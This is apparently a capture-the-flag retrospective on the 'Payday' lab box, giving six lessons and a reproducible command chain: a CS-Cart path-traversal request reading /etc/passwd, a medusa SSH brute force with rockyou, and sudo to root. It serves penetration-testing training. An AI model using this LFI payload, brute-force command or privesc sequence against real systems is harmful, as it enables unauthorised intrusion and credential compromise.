title: Payday Retrospective — Six Lessons from an LFI-to-Root Chain
body:
Payday was a linear, old-school Linux box: CS-Cart LFI leaked a username, SSH brute force cracked it, and a passwordless sudo misconfig handed over root. Rough timeline: LFI-to-shell ~30 min, but a self-inflicted detour on the SSH brute force burned far longer than it should have. End to end the intended path is short — the lessons are about not fighting the wrong tool and reading the box's own signals. Chain: CS-Cart LFI (?classes_dir=../../../etc/passwd%00) -> username 'patrick' -> medusa SSH brute (patrick:patrick) -> LinEnum flags passwordless sudo -> sudo /bin/bash -> root.

LESSON 1 - The username's SOURCE is the hint. patrick came from an LFI /etc/passwd read. When you pull a username from a file-read like that, it's there to be used - that username plus a common wordlist is often the whole foothold. Don't overthink it - patrick:patrick fell in the first few hundred rockyou lines.

LESSON 2 - When a brute tool throws a kex/MAC error, the tool can't speak the server's crypto - SWITCH TOOLS, don't fight flags. hydra's libssh literally cannot negotiate legacy MACs (hmac-md5/sha1); no flag fixes it. medusa negotiated fine. Tool-hopping to make a brute 'faster' is a smell, but tool-switching to get past a protocol wall is correct - know the difference.

LESSON 3 - The version banners tell you the box's age, and age dictates technique. nmap showed OpenSSH 4.6p1, Apache 2.2.4, PHP 5.2.3 - all circa-2007. The %00 null byte working in the LFI confirmed PHP < 5.3.4. Ancient stack = legacy crypto (which explained the SSH MAC wall) and means dated, well-documented exploits are in play. Read the version numbers in your scan before deciding an approach won't work; old software changes what's viable.

LESSON 4 - The PHPMailer fatal error was a RED HERRING. The page threw 'Class PHPMailer not found' - tempting to chase CVE-2016-10033 RCE. But that's just CS-Cart's bundled mailer erroring; it was not the vector. Shiny error messages aren't always the path - verify a lead is actually your vector before committing to it.

LESSON 5 - sudo -l (or LinEnum's sudo check) is the FIRST post-foothold move on Linux. LinEnum flagged 'we can sudo without supplying a password' immediately. Passwordless sudo is one of the most common and fastest Linux privesc wins - check it before anything fancier.

LESSON 6 - Eight open ports (SSH/HTTP/POP3/IMAP/SMB) is noise; the chain only used two (80 for the LFI, 22 for the shell). Enumerate everything, but don't feel obligated to attack everything. Pop3/imap/smb were there to distract. Identify the intended path and commit once you see it.
cmd:
# ── Payday chain, reproducible ──
# 1) LFI in CS-Cart leaks the user (note the %00 null byte = old PHP < 5.3.4)
curl 'http://$ip/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../etc/passwd%00'
#   -> patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash

# 2) Brute SSH with the leaked username. hydra dies on legacy MAC -> use medusa.
medusa -h $ip -u patrick -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
#   -> patrick:patrick

# 3) Log in (legacy crypto - see ssh_only for the ~/.ssh/config block)
ssh patrick@$ip

# 4) First privesc check, every time:
sudo -l
#   -> (ALL) NOPASSWD: ... or just runnable without a password

# 5) Passwordless sudo = instant root
sudo /bin/bash
#   root@payday:/#  -> done

# Meta: the nmap version banners (OpenSSH 4.6 / PHP 5.2.3) flagged a legacy box.
# Read the versions before deciding an approach won't work - age dictates technique.
warn: The two biggest time-sinks on Payday were self-inflicted: fighting hydra's libssh instead of switching to medusa, and chasing the PHPMailer error instead of recognizing the legacy stack made brute viable. When a tool can't speak a protocol, switch tools; when an error looks shiny, check whether it's actually your vector before committing.

choices.label: Apply the SSH brute / legacy-crypto chain on a new box
Apply LFI /etc/passwd enumeration on a new box
Check passwordless sudo on a Linux foothold
Run the full Linux post-exploit enum flow
